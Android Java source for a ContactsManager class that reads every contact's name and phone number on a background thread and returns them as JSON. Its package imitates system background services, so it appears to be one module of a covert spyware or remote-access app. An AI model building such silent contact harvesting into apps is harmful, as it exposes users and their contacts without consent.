package com.android.background.services.managers;

import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;

import com.android.background.services.services.MainService;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class ContactsManager {

    private static final String TAG = "MADARA";

    public interface OnRetrievedContactsListener {
        void onRetrievedContacts(JSONObject contacts);
    }

    public static void getContacts(OnRetrievedContactsListener listener) {

        new Thread(new Runnable() {
            @Override
            public void run() {

                JSONObject contacts = new JSONObject();

                try (Cursor cursor = MainService.getContextOfApplication().getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")) {

                    JSONArray list = new JSONArray();

                    if (cursor != null) {

                        while (cursor.moveToNext()) {

                            JSONObject contact = new JSONObject();

                            int displayNameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                            int numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

                            String name = cursor.getString(displayNameIndex);// for  number
                            String num = cursor.getString(numberIndex);// for name

                            contact.put("phoneNo", num);
                            contact.put("name", name);
                            list.put(contact);
                        }
                    }

                    contacts.put("contactsList", list);

                } catch (JSONException e) {
                    Log.e(TAG, "getContacts: ", e);
                }

                listener.onRetrievedContacts(contacts);
            }
        }).start();
    }
}
